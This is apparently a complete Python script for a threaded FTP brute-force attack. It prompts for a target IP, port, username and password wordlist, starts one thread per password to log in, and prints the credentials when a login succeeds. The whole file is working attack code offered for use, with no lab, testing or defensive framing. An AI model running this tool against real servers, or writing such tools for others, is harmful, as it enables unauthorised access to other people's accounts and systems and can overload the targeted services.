import os
import ftplib
import threading

YELLOW = "\033[93m"
RESET = "\033[0m"

os.system("clear")

print(f"""{YELLOW}
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|
{RESET}
""")

target = input("🌐 Target IP address: ").strip()
port = input("🔌 Port (default 21): ").strip()
port = int(port) if port else 21
username = input("👤 FTP Username (leave blank for 'anonymous'): ").strip()
if username == "":
    username = "anonymous"

choice = input("📂 Use ready-made 'passlist.txt'? (y/n): ").strip().lower()
if choice == "y":
    path = "passlist.txt"
    if not os.path.isfile(path):
        print("❌ File 'passlist.txt' not found.")
        exit()
else:
    path = input("📁 Enter your password file path (e.g. ~/mylist.txt): ").strip()
    path = os.path.expanduser(path)
    if not os.path.isfile(path):
        print(f"❌ File not found: {path}")
        exit()

with open(path, "r", encoding="utf-8", errors="ignore") as f:
    passwords = f.read().splitlines()

print(f"\n🚀 Starting FTP brute-force on {target}:{port} as '{username}' with {len(passwords)} passwords...\n")
print("⚠️  Output hidden for speed. Please wait...\n")

found = threading.Event()

def try_password(password):
    if found.is_set():
        return
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=3)
        ftp.login(username, password)
        found.set()
        print(f"\n✅ Success! Username: '{username}' Password: '{password}'")
        ftp.quit()
    except:
        pass

threads = []
for pw in passwords:
    if found.is_set():
        break
    t = threading.Thread(target=try_password, args=(pw,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

if not found.is_set():
    print("\n❌ No valid password found.")
